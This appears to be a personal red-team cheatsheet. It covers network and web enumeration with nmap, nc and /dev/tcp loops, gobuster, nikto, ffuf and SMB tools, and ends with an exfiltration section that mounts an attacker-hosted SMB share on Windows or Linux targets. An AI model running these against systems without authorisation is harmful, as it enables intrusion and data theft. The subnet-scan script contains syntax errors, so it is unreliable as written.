## Redteamer's cheatsheet

### Enumeration 

#### Nmap - initial one, a full one and an UDP one, all of them in parallel
nmap -sV -O --top-ports 50 --open -oA nmap/initial <ip or cidr>

nmap -sC -sV -O --open -p- -oA nmap/full <ip or cidr>

nmap -sU -p- -oA nmap/udp <ip or cidr>

##### To specifiy the script & port
nmap --scripts vuln,safe,discovery -p 443,80 <ip or cidr>
##### Servers that could be not ping ?then add the flag -Pn
nmap -Pn --top-ports 50 --open -oA nmap/initial <ip or cidr>

##### Without Nmap 
###### nc + bash
If you get in a machine that doesn’t has nmap installed, you can do a basic discovery of (for example), top 20 ports open in 192.168.30 by doing:
~~~
top10=(20 21 22 23 25 80 110 139 443 445 3389); for i in "${top10[@]}"; do nc -w 1 192.168.30.253 $i && echo "Port $i is open" || echo "Port $i is closed or filtered"; done 
~~~

/dev/tcp/ip/port or /dev/udp/ip/port
Alternatively, is possible to do the same than above but by using the special dev files /dev/tcp/ip/port or /dev/udp/ip/port (for example nc is not found):
~~~
top10=(20 21 22 23 25 80 110 139 443 445 3389); for i in "${top10[@]}"; do (echo > /dev/tcp/192.168.30.253/"$i") > /dev/null 2>&1 && echo "Port $i is open" || echo "Port $i is closed"; done
~~~
Taking these last examples, is straightforward to create a dummy script for scan a hole /24 net (for example):

```
#!/bin/bash
subnet="192.168.30"
top10=(20 21 22 23 25 80 110 139 443 445 3389)
for host in range {1..255}; do
    for port in "${top10[@]}"; do
        (echo > /dev/tcp/"${subnet}.${host}/${port}") > /dev/null 2>& && echo "Host ${subnet}.${host} has ${port} open" || "Host ${subnet}.${host} has ${port} closed"
    done
done
```
##### Banner grabbing (without nmap)
If nmap didn’t grab banners (or is not installed), you can do it with /dev/tcp/ip/port /dev/udp/ip/port or by using telnet.
~~~
/dev/tcp/ip/port or /dev/udp/ip/port
cat < /dev/tcp/192.168.30.253/22
SSH-2.0-OpenSSH_6.2p2 Debian-6
^C pressed here
~~~
For doing it with udp ports is the same, but changing tcp for udp

###### telnet
~~~
telnet 192.168.30.253 22
SSH-2.0-OpenSSH_6.2p2 Debian-6
^C pressed here
~~~

###### Web directorie/file scanner
###### Gobuster
Scan all the directories/files by extension:
~~~
gobuster dir -u http://192.168.24.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,py -o webscan/gobuster-extensions
~~~
For scanning without extensions, just take out the -x

###### Nikto
Sometimes Nikto shows juicy information, I tend to run it like:
~~~
nikto -Format txt -o webscan/nikto-initial -host http://192.168.24.24 -p 8080
~~~

###### fuff
Web fuzzer, you can get fuff here, it basically bruteforces the dirs.
~~~
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.24.24/FUZZ
~~~

##### Samba 
###### smbclient
Check if there is anonymous login enabled:
~~~
smbclient -L 192.168.24.24
~~~
###### impacket
Is also possible to use impacket in the same way than smbclient to check for anonymous login (and a lot more as browse the shares) in case of incompatible versions.
~~~
/usr/share/doc/python3-impacket/examples/smbclient.py ""@192.168.24.24
~~~
###### smbmap
Check which permissions we have in those shares (if there are):
~~~
smbmap -H 192.168.24.24
Or having an user:
smbmap -u ceso -H 192.168.24.24
~~~

###### Version (nmap didn’t detect it)
Sometimes nmap doesn’t show the version of Samba in the remote host, if this happens, a good way to know which version the remote host is running, is to capture traffic with wireshark against the remote host on 445/139 and in parallel run an smbclient -L, do a follow tcp stream and with this we might see which version the server is running.

![image](https://user-images.githubusercontent.com/37288034/80310413-a2be9d00-8800-11ea-82b8-21dc0e059a1e.png)

##### Exfiltration
###### Samba
Generate a samba server with Impacket:

impacket-smbserver tools /home/kali/tools
Mount in Windows
Mounting it in Windows with Powershell:
~~~
New-PSDrive -Name "tools" -PSProvider "Filesystem" -Root "\\192.168.42.42\tools"
~~~

###### Mounting it without Powershell:
~~~
net use z: \\192.168.42.42\tools"
~~~
On windows, to list mounted shares, either Powershell or without it:
~~~
Powershell: Get-SMBShare
Without Powershell: net share
~~~

Mount in Linux
Is needed to have installed cifs-utils, to install it (in debian based):
~~~
sudo apt-get install cifs-utils
~~~
To mount it:
~~~
sudo mount -t cifs //192.168.42.42/tools ~/my_share/
~~~
To list mounted shares:
~~~
mount | grep cifs
grep cifs /proc/mount
~~~
##### HTTP
From your local attacker machine, create a http server with:
~~~
sudo python3 -m http.server 80
sudo python2 -m SimpleHTTPServer 80
~~~
It’s also possible to specify which path to share, for example:
~~~
sudo python3 -m http.server 80 --dir /home/kali/tools
~~~
